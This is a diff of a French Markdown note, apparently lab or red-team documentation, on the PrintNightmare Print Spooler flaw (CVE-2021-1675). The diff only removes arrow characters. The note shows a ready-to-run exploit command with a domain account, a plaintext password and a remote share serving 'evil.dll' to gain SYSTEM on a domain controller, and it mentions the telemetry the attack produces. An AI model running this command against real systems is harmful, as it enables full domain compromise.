@@ -13,7 +13,7 @@
 
 ## 1. Description
 
-**PrintNightmare** est une faille du **service Spooler d'impression** de Windows. La fonction `RpcAddPrinterDriverEx` permettait à un utilisateur authentifié de faire **charger un driver d'impression arbitraire** (un DLL malveillant) par le service Spooler, qui tourne en **SYSTEM**. Résultat : **exécution de code en SYSTEM**. Comme le Spooler tourne aussi sur les **DC**, un simple compte de domaine pouvait obtenir SYSTEM **sur un contrôleur de domaine** → compromission totale.
+**PrintNightmare** est une faille du **service Spooler d'impression** de Windows. La fonction `RpcAddPrinterDriverEx` permettait à un utilisateur authentifié de faire **charger un driver d'impression arbitraire** (un DLL malveillant) par le service Spooler, qui tourne en **SYSTEM**. Résultat : **exécution de code en SYSTEM**. Comme le Spooler tourne aussi sur les **DC**, un simple compte de domaine pouvait obtenir SYSTEM **sur un contrôleur de domaine**  compromission totale.
 
 ## 2. Prérequis
 - Un compte de domaine standard.
@@ -25,7 +25,7 @@
 ```bash
 # Charger un DLL malveillant via le Spooler distant
 CVE-2021-1675.py datacorp.local/othmane:Marketing2025@10.0.0.10 '\\10.0.0.50\share\evil.dll'
-# → exécution du DLL en SYSTEM sur la cible
+#  exécution du DLL en SYSTEM sur la cible
 ```
 
 ## 4. Télémétrie générée (logs)
